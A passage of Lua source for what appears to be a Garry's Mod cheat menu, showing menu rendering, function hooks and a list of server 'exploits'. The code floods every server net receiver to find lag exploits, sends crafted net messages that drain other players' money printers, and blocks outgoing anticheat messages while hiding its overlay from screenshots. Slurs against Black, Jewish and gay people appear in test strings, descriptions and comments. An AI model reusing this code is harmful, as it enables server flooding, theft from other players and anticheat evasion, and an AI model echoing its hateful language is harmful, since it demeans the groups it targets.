            cmdp.Desc = isfunction(t.desc) and t.desc() or t.desc
            local status = isfunction(t.status) and t.status() or t.status

            if status ~= nil and StatusText[status] and StatusColors[status] then
                cmdp.Status = StatusText[status]
                cmdp.StatusCol = StatusColors[status]
            else
                cmdp.Status = "Unknown"
                cmdp.StatusCol = StatusColors[2]
            end

            cmdp.Paint = function(s, w, h)
                if not KV.Menu or not KV.Menu:IsVisible() then return cmdp:Remove() end
                local severity = isfunction(t.severity) and t.severity() or t.severity
                draw.RoundedBox(10, 0, 0, w, h, KV.GetColor(severity) or Color(255, 255, 255))
                draw.RoundedBox(10, 1, 1, w - 2, h - 2, Color(50, 50, 50, 255))

                local r_tbl = KV.RecursiveGetVar(t, {"vars", "Think"}, "table", true)

                if r_tbl.cooldown and r_tbl.cooldown - KV.REAL_CURTIME >= 0 then
                    local cooldown = r_tbl.cooldown - KV.REAL_CURTIME
                    draw.SimpleText(string.format(cmdp.Cmd .. "%s", " [" .. KV.SecondsToClock(cooldown) .. "]"), "KVMenuText", 10, 5, Color(255, 255, 255))
                else
                    r_tbl.cooldown = 0
                    draw.SimpleText(cmdp.Cmd, "KVMenuText", 10, 5, Color(255, 255, 255))
                end

                if severity > 0 then
                    draw.SimpleText("Status: ", "KVMenuText", 595 - (KV.Menu:GetWide() - cmdp:GetWide()), 5, Color(255, 255, 255))
                    draw.SimpleText(cmdp.Status, "KVMenuText", 635 - (KV.Menu:GetWide() - cmdp:GetWide()), 5, cmdp.StatusCol)
                end

                draw.SimpleText(cmdp.Desc, "KVMenuText", 10, 26, Color(205, 205, 255, 100))
            end

            local width, height = cmdp:GetSize()
            local nfunctions = #t.functions
            local x = 10

            for _, tab in ipairs(t.functions) do
                tab.max_width = (width / nfunctions) - (nfunctions * 5)

                if tab.required == nil or tab.required == true then
                    if tab.typ == "func" then
                        x = (x + 5) + KV.MakeFunctionButton(cmdp, x, 42, tab.Name, t, nil, tab)
                    elseif tab.typ == "bool" then
                        x = (x + 5) + KV.MakeFunctionButton(cmdp, x, 42, not ((KV.NotNil(tab.bool) and t.bools[tab.bool]) or t.bools.enabled) and ((tab.ToggleText and tab.ToggleText[1]) or "Start") or ((tab.ToggleText and (tab.ToggleText[2] or tab.ToggleText[1])) or "Stop"), t, nil, tab, tab.border)
                    elseif tab.typ == "players" then
                        x = (x + 5) + KV.MakeEntitySelectionButton(cmdp, player.GetAll(), x, 42, tab)

                        if not KV.IsStored(tab.addr) then
                            KV.Store(tab.addr, tab.default)
                        end
                    elseif tab.typ == "player" then
                        x = (x + 5) + KV.MakeEntitySelectionButton(cmdp, player.GetAll(), x, 42, tab, true)

                        if not KV.IsStored(tab.addr) then
                            KV.Store(tab.addr, tab.default)
                        end
                    elseif tab.typ == "entities" then
                        x = (x + 5) + KV.MakeEntitySelectionButton(cmdp, tab.tbl, x, 42, tab)

                        if not KV.IsStored(tab.addr) then
                            KV.Store(tab.addr, tab.default)
                        end
                    elseif tab.typ == "entity" then
                        x = (x + 5) + KV.MakeEntitySelectionButton(cmdp, tab.tbl, x, 42, tab, true)

                        if not KV.IsStored(tab.addr) then
                            KV.Store(tab.addr, tab.default)
                        end
                    elseif tab.typ == "string" then
                        x = (x + 5) + KV.MakeTextInputButton(cmdp, x, 42, tab.Name, tab.default, tab.addr)

                        if not KV.IsStored(tab.addr) then
                            KV.Store(tab.addr, tab.default)
                        end
                    elseif tab.typ == "combo" then
                        x = (x + 5) + KV.MakeComboButton(cmdp, x, 42, tab.Name, tab.default, tab.addr, tab.tbl, tab.restriction, tab.var, tab.sort, tab.find)

                        if not KV.IsStored(tab.addr) then
                            KV.Store(tab.addr, tab.default)
                        end
                    elseif tab.typ == "float" then
                        x = (x + 5) + KV.MakeNumberInputButton(cmdp, x, 42, tab.Name, tab.default, tab.min, tab.max, tab.addr)

                        if not KV.IsStored(tab.addr) then
                            KV.Store(tab.addr, tab.default)
                        end
                    elseif tab.typ == "vector" then
                        x = (x + 5) + KV.MakeVectorInputButton(cmdp, x, 42, tab.Name, tab.default, tab.addr)

                        if not KV.IsStored(tab.addr) then
                            KV.Store(tab.addr, tab.default)
                        end
                    end
                end
            end

            Plist:AddItem(cmdp)
        end
    end

    local reset = false

    if KV.BAIT_LIMIT ~= KV.GetStored("baitthreshold", 5) then
        reset = true
        KV.BAIT_LIMIT = KV.GetStored("baitthreshold", 5)
    end

    local det_call = KV.DetourCall or false
    KV.DetourCall = true

    for k, v in ipairs(KV.GetAllExploits()) do
        if reset then
            v.scanned = false
        end

        KV.BlockNetOutgoing = true

        if v.prevalidated then
            KV.GENERAL_OVERRIDE = true
        end

        local scan = (v.scanned and not v.scan_always) or v.scan(v)
        KV.GENERAL_OVERRIDE = false
        KV.BlockNetOutgoing = false

        if scan then
            local Name = v.Name

            if v.severity ~= 0 and #KV.GetExploit(Name) > 1 then
                Name = Name .. " #" .. v.Index
            end

            KV.CreatePanel(Name, v, Plist)

            if scan ~= true then
                v.channel = scan
            end

            if not v.scanned then
                if isfunction(v.initial) then
                    v.initial(v)
                end

                v.scanned = true
            end

            if v.hooks and istable(v.hooks) then
                for k2, v2 in pairs(v.hooks) do
                    if KV.Hooks[k2] and KV.Hooks[k2][""] then continue end

                    if events[k2] and not eventsR[k2] then
                        gameevent.Listen(k2)
                        eventsR[k2] = true
                    end

                    local ret_val = nil

                    hook_Add(k2, "", function(gm_ret, ...)
                        local det_call = KV.DetourCall or false
                        KV.DetourCall = true
                        local skip = false

                        if KV.Killswitch or KV.Unload then
                            skip = true
                        end

                        local varargs = {...}

                        if k2:find("Draw") or k2:find("Render") or k2:find("HUD") or k2:find("Paint") then
                            if not system.HasFocus() or input.IsKeyDown(input.GetKeyCode(input.LookupBinding("jpeg") or "F5")) or input.IsKeyDown(KEY_F12) then
                                skip = true
                            end
                        end

                        if not skip then
                            for k3, v3 in ipairs(KV.GetVarExploits({"bools", "enabled"}, KV.TYPEVARS.EQUALTO, true)) do
                                if not KV.GetEnabled(v3) then continue end

                                if v3.hooks and istable(v3.hooks) and v3.scanned then
                                    local cooldown = KV.RecursiveGetVar(v3, {"vars", k2, "cooldown"}, "number")

                                    if cooldown and cooldown - KV.REAL_CURTIME >= 0 then continue end

                                    if k2 == "Think" and isfunction(v3.hooks[k2]) then
                                        if v3.severity == 0 then
                                            ret = v3.hooks[k2]({}, v3, varargs, gm_ret)

                                            if ret or ret == false then
                                                ret_val = ret
                                            end
                                        else
                                            if KV.NEXT_TIME <= SysTime() then
                                                KV.RAN_THIS_TICK = true
                                                local tpt = isfunction(v3.times_per_tick) and v3.times_per_tick(v3) or v3.times_per_tick
                                                local limit = 0

                                                if not istable(tpt) then
                                                    limit = math.Clamp(math.Round(KV.SafeToNumber(KV.SafeToNumber(tpt))), 1, math.huge)
                                                else
                                                    limit = KV.GetRateLimitedTimesPerTick() / #tpt
                                                end

                                                if limit == math.huge then
                                                    limit = KV.GetStored("tpsrate", KV.RATE_LIMIT)
                                                end

                                                if limit < KV.GetRateLimitedTimesPerTick() then
                                                    if not KV.BUFFER then
                                                        KV.BUFFER = 0
                                                    end

                                                    KV.BUFFER = KV.BUFFER + KV.GetRateLimitedTimesPerTick() - limit
                                                end

                                                if not limit or limit > KV.GetRateLimitedTimesPerTick() then
                                                    if KV.BUFFER then
                                                        local tbl = KV.GetVarTable(KV.GetVarExploits({"bools", "enabled"}, KV.TYPEVARS.EQUALTO, true), "times_per_tick", KV.TYPEVARS.MORETHAN, KV.GetRateLimitedTimesPerTick())

                                                        local tbl_C = 0

                                                        for k4, v4 in ipairs(tbl) do
                                                            tbl_C = tbl_C + KV.GetEnabledCount(v4)
                                                        end

                                                        local BUFFER = math.Round(KV.BUFFER / tbl_C)

                                                        if BUFFER == 0 then
                                                            BUFFER = KV.BUFFER
                                                        end

                                                        BUFFER = math.Round(math.Clamp(BUFFER, 0, math.huge))
                                                        limit = KV.GetRateLimitedTimesPerTick() + BUFFER
                                                        KV.BUFFER = math.Round(math.Clamp(KV.BUFFER - BUFFER, 0, math.huge))
                                                    else
                                                        limit = KV.GetRateLimitedTimesPerTick()
                                                    end
                                                end

                                                local mpt = isfunction(v3.msgs_per_tick) and v3.msgs_per_tick(v3) or (v3.msgs_per_tick or 1)

                                                if mpt > 1 then
                                                    limit = limit / mpt
                                                end

                                                limit = math.Clamp(math.Round(KV.SafeToNumber(limit)), 1, math.huge)

                                                --[[if(v3.Sender) then
                                                    print("Sending " .. limit * mpt .. " for " .. v3.Name, v3.Index)
                                                end]]
                                                for i = 1, limit do
                                                    ret = v3.hooks[k2]({}, v3, varargs, gm_ret)

                                                    if ret or ret == false then
                                                        ret_val = ret
                                                    end
                                                end
                                            end
                                        end
                                    elseif isfunction(v3.hooks[k2]) then
                                        if k2 == "PostRender" then
                                            cam.Start2D()
                                            ret = v3.hooks[k2]({}, v3, varargs, gm_ret)
                                            cam.End2D()
                                        else
                                            ret = v3.hooks[k2]({}, v3, varargs, gm_ret)
                                        end

                                        if ret or ret == false then
                                            ret_val = ret
                                        end
                                    end
                                end
                            end
                        end

                        if k2 == "Think" and KV.RAN_THIS_TICK then
                            KV.NEXT_TIME = SysTime() + (engine.TickInterval() * (KV.TICK_RATE / KV.GetStored("tickdelay", KV.TICK_RATE)))
                            KV.RAN_THIS_TICK = false
                        end

                        KV.DetourCall = det_call

                        if ret_val then
                            return ret_val
                        elseif ret_val == false then
                            return false
                        end
                    end)
                end
            end
        end
    end

    KV.DetourCall = det_call
    ActiveCount()

    if istable(LAST_TABLE) then
        table.Empty(LAST_TABLE)
    end
end

concommand.Add("awd", KV.OpenMenu)

KV.concommand.Add("lowkey_freecam", function(p, k, d)
    KV.Freecam.Toggle(d)
end)

--///Key system wip Date Sex////
local Timestamp = os.time()
local TimeString = os.date("%H:%M:%S - %d/%m/%Y", Timestamp)
print("Timestamp:", Timestamp)
print("TimeString:", TimeString)

--///Key system wip Date Sex////
local messagetypes = {
    [1] = {
        ["col"] = Color(255, 255, 255),
        ["icon"] = Material("icon16/application_xp_terminal.png")
    },
    -- neutral message
    [2] = {
        ["col"] = Color(250, 200, 140),
        ["icon"] = Material("icon16/cross.png")
    },
    -- negative message
    [3] = {
        ["col"] = Color(180, 250, 180),
        ["icon"] = Material("icon16/tick.png")
    },
    -- positive message
    [4] = {
        ["col"] = Color(250, 140, 140),
        ["icon"] = Material("icon16/error.png")
    },
    -- error message
    [5] = {
        ["col"] = Color(180, 180, 250),
        ["icon"] = Material("icon16/user.png")
    },
    -- blue message
    [6] = {
        ["col"] = Color(250, 250, 180),
        ["icon"] = Material("icon16/lightbulb.png")
    },
}

-- lightbulb message
local aegiscomponent = {
    color = -1,
    name = "Aegis"
}

local notifies = {}
local tableinsert = table.insert
local istable = istable
local error = error

function KV.Notify(component, type, text)
    if not messagetypes then return end

    if not component or not istable(component) then
        component = {
            color = Color(255, 0, 0),
            name = "DEFINE A SCRIPT COMPONENT PROPERLY YOU AUTIST"
        }
    end

    if not messagetypes[type] then
        tableinsert(notifies, {
            ["time"] = CurTime() + 10,
            ["ccol"] = Color(255, 0, 0),
            ["ctxt"] = "[ AEGIS ERROR ]",
            ["icon"] = "icon16/error.png",
            ["col"] = Color(255, 0, 0),
            ["txt"] = "Invalid aegis notify type! must be 1-6!"
        })

        return
    end

    if component.color == -1 then
        component.color = Color(55, 55, 155)
    end

    tableinsert(notifies, {
        ["time"] = CurTime() + 10,
        ["ccol"] = component.color,
        ["ctxt"] = "[ " .. component.name .. " ]",
        ["icon"] = messagetypes[type].icon,
        ["col"] = messagetypes[type].col,
        ["txt"] = text
    })
end

--[[for i=1, 6 do
    KV.Notify( { color = Color(150, 150, 150, 245), name = "KV" }, i, "KV v2 Colour Test" )
end]]
local function DrawNotifies()
    --  if !messagetypes then return end
    local x, y = 10, ScrH() / 2
    local cutoff = 0

    for k, v in pairs(notifies) do
        if cutoff > 30 then continue end
        cutoff = cutoff + 1
        local lx = 10
        local timeleft = v.time - CurTime()

        -- pull back into the edge of the screen at the end of the timer
        if timeleft < 2 then
            lx = 10 - ((2 - timeleft) * 800)
        end

        -- your time is up faggot
        if timeleft <= 0.5 then
            notifies[k] = nil
            continue
        end

        local bgcol = Color(v.ccol.r, v.ccol.g, v.ccol.b, 145)
        local bgcol2 = Color(v.col.r, v.col.g, v.col.b, 145)
        surface.SetDrawColor(v.ccol)
        local txw, txh = draw.SimpleText(v.ctxt, "Trebuchet18", lx, y, v.ccol, 0, 0)
        surface.SetDrawColor(bgcol)
        surface.DrawRect(lx - 5, y - 1, txw + 10, 20)
        surface.DrawLine(lx - 5, y - 1, lx - 5 + (txw + 10), y - 1)
        surface.SetDrawColor(Color(255, 255, 255, 150))
        surface.SetMaterial(v.icon)
        surface.DrawTexturedRect((lx - 5) + txw + 16, y + 1, 16, 16)
        txw = txw + 22
        local txw2, txh2 = draw.SimpleText(v.txt, "Trebuchet18", (lx - 5) + txw + 20, y, v.col, 0, 0)
        surface.SetDrawColor(bgcol2)
        surface.DrawRect((lx - 5) + txw + 15, y - 1, txw2 + 10, 20)
        surface.DrawLine((lx - 5) + txw + 15, y - 1, ((lx - 5) + txw + 15) + txw2 + 10, y - 1)
        y = y - 25
    end
end

setmetatable(net.ReadVars, {
    __index = function(self, key) return net.ReadVars[key] or net.ReadVars[0] end,
})

--[[KV.AddAllReceivers = function()
    for i = 1, math.huge do
        local str = util.NetworkIDToString(i)
        if not str then return false end
    
        KV.AddExploit( str, {
            desc = "Potential lagsploit",
            severity = 0,
            bools = {enabled = false},
            status = -1,
            times_per_tick = math.huge,
            scan = function() return KV.ValidNetString( str ) end,
            hooks = {
                Think = function(tbl, sploit)
                    KV.NetStart( sploit,str)
                    net.SendToServer()
                end,
            },
            functions = {
                { typ = "bool", },
            },
        } ) 
    end
end
KV.concommand.Add("lowkey_addall", KV.AddAllReceivers)]]
local str = "\n"

if KV.Developer then
    KV.AddExploit("Lagsploit Tester", {
        desc = "Bomb any receiver to find lagsploits",
        severity = -1,
        bools = {
            enabled = false
        },
        status = 1,
        times_per_tick = math.huge,
        vars = {},
        scan = function() return true end,
        hooks = {
            Think = function(tbl, sploit)
                if KV.GetStored("tester1")[2] == "*" then
                    sploit.times_per_tick = KV.GetStored("tpsrate", KV.RATE_LIMIT) / #KV.Receivers

                    for k, v in ipairs(KV.Receivers) do
                        if v.str ~= "*" then
                            KV.NetStart(sploit, v.str)
                            net.SendToServer()
                        end
                    end
                else
                    sploit.times_per_tick = math.huge
                    KV.NetStart(sploit, KV.GetStored("tester1")[2])
                    net.SendToServer()
                end
            end,
        },
        functions = {
            {
                typ = "combo",
                Name = "Sender",
                tbl = KV.GetAllReceivers(),
                restriction = nil,
                var = "str",
                sort = "str",
                find = "str",
                default = -1,
                addr = "tester1"
            },
            {
                typ = "bool",
            },
        },
    })
end

--////////////////////////////////////////////- SPLOITS -////////////////////////////////////////////////
KV.AddExploit("Test Sploit", {
    desc = "Does nothing, used for menu testing",
    severity = 1,
    bools = {
        enabled = true
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return false end,
    --[[count = {
        ["Active"] = 25,
        ["Total"] = 25,
    },]]
    hooks = {
        Think = function(tbl, sploit)
            PrintTable(tbl)
            print(KV.GetStored("teststring", "") .. " is such a fucking gay nigger omg")
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Niggers to kill",
            default = 1,
            min = 0,
            max = 100,
            addr = "testfloat"
        },
        {
            typ = "string",
            Name = "Enter a gay cunt",
            default = "you",
            addr = "teststring"
        },
        {
            typ = "players",
            addr = "testplayers"
        },
        {
            typ = "func",
            Name = "Fist his holes",
            args = {KV.GetLP()},
        },
    },
})

function KV.TIME_TO_TICKS(dt)
    return KV.SafeToNumber(0.5 + KV.SafeToNumber(dt) / engine.TickInterval())
end

function KV.TICKS_TO_TIME(t)
    return engine.TickInterval() * t
end

function KV.ROUND_TO_TICKS(t)
    return engine.TickInterval() * KV.TIME_TO_TICKS(t)
end

KV.DRAW_TPS = 0
KV.OS_TIME = 0
KV.DROPPED_FRAMES = 0
KV.TICK_RATE = math.Round(1 / engine.TickInterval())
KV.RATE_LIMIT = 1028
KV.NEXT_TIME = 0
KV.REAL_CURTIME = 0

--text, font, x, y, col
function KV.DrawText(...)
    if true then return draw.SimpleText(...) end
    surface.SetFont(font)
    surface.SetTextColor(col)
    surface.SetTextPos(x, y)
    surface.DrawText(tostring(text))
end

function KV.GetRateLimitedTimesPerTick()
    local enabled = KV.GetVarExploits({"bools", "enabled"}, KV.TYPEVARS.EQUALTO, true)

    local senders = KV.GetVarTable(enabled, "Sender", KV.TYPEVARS.EQUALTO, true)
    local count = #senders

    for k, v in ipairs(senders) do
        local tbl_C = table.Count(v.bools)

        if tbl_C > 1 then
            for k2, v2 in pairs(v.bools) do
                if k2 ~= "enabled" then
                    if v2 == true then
                        count = count + 1
                    end
                else
                    count = count - 1
                end
            end
        end
    end

    local limit = count

    if limit <= 0 then
        limit = 1
    end

    return math.Clamp(math.Round((KV.GetStored("tpsrate", KV.RATE_LIMIT) / KV.GetStored("tickdelay", KV.TICK_RATE) / limit) * (KV.GetStored("tickdelay", KV.TICK_RATE) / math.min(KV.GetStored("tickdelay", KV.TICK_RATE), math.max(KV.GetStored("fpsthreshold", 5), 1 / FrameTime())))), 1, math.huge)
end

if GAMEMODE.LimitHit then
    GAMEMODE.LimitHit = function() return false end
end

KV.DrawPanels = {}

KV.AddExploit("Showcase", {
    desc = "Showcase for creating exploits",
    severity = 0,
    bools = {
        enabled = true
    },
    status = 4,
    times_per_tick = 1,
    vars = {},
    scan = function() return true end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            KV.GetLP():SetViewPunchAngles(Angle(0, 0, 0))
            local cmd = varargs[1]
            if cmd:TickCount() == 0 or cmd:CommandNumber() == 0 then return end

            if input.LookupBinding("+speed", true) ~= "no value" and input.IsKeyDown(input.GetKeyCode(input.LookupBinding("+speed", true))) and not cmd:KeyDown(IN_SPEED) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_SPEED))
            end

            hook.Run("CL_Move", unpack(varargs))
        end,
        SetupMove = function(tbl, sploit, varargs)
            hook.Run("CL_PostMove", unpack(varargs))
        end,
        PostRender = function()
            KV.GetLP():SetViewPunchAngles(Angle(0, 0, 0))
            render.SetRenderTarget(render.GetRenderTarget())
            local ent = KV.IsHovered or KV.SpectateEnt

            if (KV.Freecam.Enabled == true or (IsValid(ent) and ent.OBBCenter)) and not gui.IsGameUIVisible() then
                render.RenderView(KV.Freecam.Data)
                --[[KV.GENERAL_OVERRIDE = true
                KV.GetLP():DrawModel()
                KV.GENERAL_OVERRIDE = false]]
            end

            KV.LAST_RENDER = SysTime()
            cam.Start3D()
            local ent = KV.IsHovered or KV.SpectateEnt

            if IsValid(ent) and ent.OBBCenter then
                if ent:IsDormant() then
                    ent:DrawModel()
                end
            else
                KV.IsHovered = false
                KV.SpectateEnt = false
            end

            hook.Run("Render3D")
            cam.End3D()
            hook.Run("Render2D")
            DrawNotifies()
        end,
        CalcView = function(tbl, sploit, varargs)
            local ply, pos, angles, fov, drawviewer = unpack(varargs)
            drawviewer = false
            local ent = KV.IsHovered or KV.SpectateEnt

            if IsValid(ent) and ent.OBBCenter then
                drawviewer = true
                pos = ent:GetPos() + ent:OBBCenter()

                local tr = util.TraceLine({
                    start = pos,
                    endpos = (ent:GetPos() + ent:OBBCenter()) - (angles:Forward() * 100),
                    filter = function(hitent)
                        if hitent == ent then return false end
                    end
                })

                pos = tr.HitPos
            else
                KV.IsHovered = false
                KV.SpectateEnt = false
            end

            if KV.Freecam.SetView then
                KV.Freecam.ViewOrigin = pos
                KV.Freecam.SetView = false
            end

            if KV.Freecam.Enabled == true then
                KV.Freecam.Data = {
                    origin = KV.Freecam.ViewOrigin,
                    drawviewer = true,
                    dopostprocess = true,
                    drawhud = true,
                    drawmonitors = true,
                    drawviewmodel = false
                }
            else
                KV.Freecam.Data = {
                    ply = ply,
                    origin = pos,
                    angles = angles,
                    fov = fov,
                    drawviewer = drawviewer,
                    dopostprocess = true,
                    drawhud = true,
                    drawmonitors = true,
                    drawviewmodel = false
                }
            end
        end,
        --return KV.Freecam.Data
        StartCommand = function(tbl, sploit, varargs)
            local cmd = varargs[2]

            if KV.Freecam.Enabled == true then
                KV.Freecam.ViewOrigin = KV.Freecam.ViewOrigin + KV.Freecam.Velocity
                KV.Freecam.Velocity = KV.Freecam.Velocity * 0.95
                local add = Vector(0, 0, 0)
                local ang = cmd:GetViewAngles()
                local move_mod = 4
                local speed_mod = 4

                if cmd:KeyDown(IN_FORWARD) then
                    add = add + ang:Forward() * move_mod
                end

                if cmd:KeyDown(IN_BACK) then
                    add = add - ang:Forward() * move_mod
                end

                if cmd:KeyDown(IN_MOVERIGHT) then
                    add = add + ang:Right() * move_mod
                end

                if cmd:KeyDown(IN_MOVELEFT) then
                    add = add - ang:Right() * move_mod
                end

                if cmd:KeyDown(IN_JUMP) then
                    add = add + Angle(0, 0, 0):Up() * move_mod
                    cmd:RemoveKey(IN_JUMP)
                end

                if cmd:KeyDown(IN_DUCK) then
                    add = add - Angle(0, 0, 0):Up() * move_mod
                    cmd:RemoveKey(IN_DUCK)
                end

                if input.LookupBinding("+speed", true) ~= "no value" and input.IsKeyDown(input.GetKeyCode(input.LookupBinding("+speed", true))) and not cmd:KeyDown(IN_SPEED) then
                    add = add * speed_mod
                end

                KV.Freecam.Velocity = KV.Freecam.Velocity + (add * RealFrameTime())
                cmd:SetForwardMove(0)
                cmd:SetSideMove(0)
                cmd:SetUpMove(0)
            end
        end,
        Tick = function(tbl, sploit)
            if KV.RAW_FRAME_TIME == (1 / engine.ServerFrameTime()) then
                KV.DROPPED_FRAMES = KV.DROPPED_FRAMES + 1
            else
                KV.RAW_FRAME_TIME = 1 / engine.ServerFrameTime()
                KV.DROPPED_FRAMES = 0
                KV.REAL_CURTIME = _G.CurTime()
            end

            if KV.OS_TIME ~= os.time() then
                KV.DRAW_TPS = math.Clamp(KV.TICK_RATE - KV.DROPPED_FRAMES, 0, KV.TICK_RATE)
                KV.OS_TIME = os.time()
            end
        end,
        Think = function(tbl, sploit)
            local pan = vgui.GetHoveredPanel()

            if IsValid(pan) and IsValid(pan.btnClose) and isfunction(pan.btnClose.SetVisible) then
                pan.btnClose:SetVisible(true)
            end
        end,
        OnReloaded = function()
            table.Empty(KV.Hooks)
            KV.RunDetours()

            if IsValid(KV.Menu) and KV.Menu:IsVisible() then
                KV.Menu:SetVisible(false)
            end

            KV.OpenMenu(true)
        end,
        concommand = {
            Run = function(sploit, varargs)
                if KV.CommandList[string.lower(varargs[2])] then
                    pcall(function()
                        KV.CommandList[string.lower(varargs[2])](unpack(varargs))
                    end)

                    return false
                end
            end
        },
        gui = {
            ["*"] = function(tabk, funck, sploit, varargs) return false end
        },
        input = {
            ["*"] = function() return false end
        },
        render = {
            SetRenderTarget = function(sploit, varargs) end
        },
        --if(KV.GetStored( "securerenderer", false )) then return false end
        util = {
            NetworkIDToString = function(sploit, varargs)
                local det_call = KV.DetourCall
                KV.DetourCall = true
                KV.NetIncomingMsg = util.NetworkIDToString(varargs[1])
                KV.DetourCall = det_call
                if not KV.NetIncomingMsg then return end

                for k, v in ipairs(KV.GetAllExploits()) do
                    local Receiver = KV.RecursiveGetVar(v, {"hooks", "net", "Receive"}, "function")

                    if Receiver then
                        if Receiver(v, KV.NetIncomingMsg) == false then return nil end
                    end
                end
            end,
        },
        input = {
            LookupBinding = function(sploit, varargs)
                local bind = input.LookupBinding(unpack(varargs))

                if bind then
                    if KV.CommandList[input.LookupKeyBinding(input.GetKeyCode(bind))] then
                        KV.RETURN_OVERRIDE = true
                    end
                end
            end,
            LookupKeyBinding = function(sploit, varargs)
                if KV.CommandList[input.LookupKeyBinding(unpack(varargs))] then
                    KV.RETURN_OVERRIDE = true
                end
            end,
        },
        --[[string = {
            lower = function(sploit, varargs)
                local str = varargs[1]
                if(str == "Odium") then 
                    return string.lower
                end
                if(str == "KV.GetTable()") then
                    return KV
                end
                local LowerCommand = string.lower( str ) || str
                if ( KV.CommandList[ LowerCommand ] != nil ) then
                    pcall(function() KV.CommandList[ LowerCommand ]( player, str, arguments, args ) end)
                end
            end,
        },]] -- might use later, somewhat secure way to add concommands in clientstate but PlayerBindPress works better
        net = {
            Receive = function(sploit, strName)
                if strName == "diagnostics1" or strName == "diagnostics2" or strName == "diagnostics3" then return false end
            end,
            --[[WriteAngle = function(sploit, varargs)
                if(KV.NetOutgoingMsg == "thirdperson_etp") then
                    varargs[1] = Angle(0,0,0,2^64)
                end
            end,]]
            ["*"] = function(tabk, funck, sploit, varargs)
                if funck:StartWith("Write") then
                    if KV.BlockNetOutgoing then
                        return false
                    elseif funck == "BytesWritten" then
                        return -1
                    elseif KV.NetOutgoingMsg == "anticheat" or KV.NetOutgoingMsg == "thisisnotcool" then
                        return false
                    elseif funck == "WriteTable" then
                        if KV.Developer then
                            PrintTable(varargs[1])
                        end
                    end
                elseif funck:StartWith("Read") then
                    if KV.BlockNetIncoming then return false end
                end
            end,
        },
        PreDrawTranslucentRenderables = function()
            EyePos()
            EyeVector()
            EyeAngles()
        end,
        PlayerBindPress = function(tbl, sploit, varargs, ret)
            if KV.CommandList[string.lower(varargs[2])] then
                pcall(function()
                    KV.CommandList[string.lower(varargs[2])](unpack(varargs))
                end)

                return true
            end

            if ret ~= nil then
                return ret
            else
                return false
            end
        end,
        cam = {},
        --Start3D = function() return false end, --End3D = function() return false end,
        _G = {
            RunConsoleCommand = function(tbl, varargs)
                if varargs[1] == "disconnect" then return false end
            end,
        },
        vgui = {
            Create = function(tbl, varargs)
                local classname, parent, name, KV = varargs[1], varargs[2], varargs[3], varargs[4]
                local ret = vgui.Create(classname, parent, name)

                if not ret then
                    print("something touched me wrongly")

                    return
                end

                ret.MenuStart = true

                if classname == "DFrame" and KV == true then
                    KV.DrawPanels[#KV.DrawPanels + 1] = ret

                    return KV.DrawPanels[#KV.DrawPanels]
                end

                return ret
            end,
        },
    },
    functions = {},
    functions = {
        {
            typ = "string",
            Name = "Enter a message",
            default = "String",
            addr = "string"
        },
        {
            typ = "float",
            Name = "Rate",
            default = KV.RATE_LIMIT,
            addr = "tpsrate",
            min = 1,
            max = KV.ARES and math.huge or 1536
        },
        {
            typ = "float",
            Name = "Ticks",
            min = 1,
            max = KV.TICK_RATE,
            default = KV.TICK_RATE,
            addr = "tickdelay"
        },
        {
            typ = "float",
            Name = "FPS",
            min = 0,
            max = math.huge,
            default = 5,
            addr = "fpsthreshold"
        },
        {
            typ = "float",
            Name = "Bait",
            min = 0,
            max = math.huge,
            default = 5,
            addr = "baitthreshold"
        },
        {
            typ = "bool",
        }
    },
})

KV.BAIT_LIMIT = KV.GetStored("baitthreshold", 5)

--////////////////////////////////////////////- MONEY -////////////////////////////////////////////////
KV.AddExploit("Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server (500 for latest, -1 for infinite)",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.DynamicNetString("SyncPrinterButtons") end,
    hooks = {
        Tick = function(tbl, sploit)
            local dist = KV.GetStored("printers1", 500)
            local ent_tbl = KV.ents.FindByGlobal("WithdrawText")

            for k, v in ipairs(ent_tbl) do
                if dist == -1 or KV.GetLP():GetPos():Distance(v:GetPos()) < dist then
                    KV.NetStart(sploit, sploit.channel)
                    net.WriteEntity(v)
                    net.WriteUInt(2, 4)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
        {
            typ = "float",
            Name = "Distance",
            min = -1,
            max = math.huge,
            default = 500,
            addr = "printers1"
        },
    },
})

KV.AddExploit("Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("DataSend") end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("GetPToggle")) do
                KV.NetStart(sploit, "DataSend")
                net.WriteFloat(2)
                net.WriteEntity(v)
                net.WriteEntity(KV.GetLP())
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("withdrawop") end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("S_Model")) do
                KV.NetStart(sploit, "withdrawop")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("NGII_TakeMoney") end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("Stats")) do
                KV.NetStart(sploit, "NGII_TakeMoney")
                net.WriteEntity(v)
                net.WriteEntity(KV.GetLP())
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("NET_DoPrinterAction") end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("Stats")) do
                KV.NetStart(sploit, "NET_DoPrinterAction")
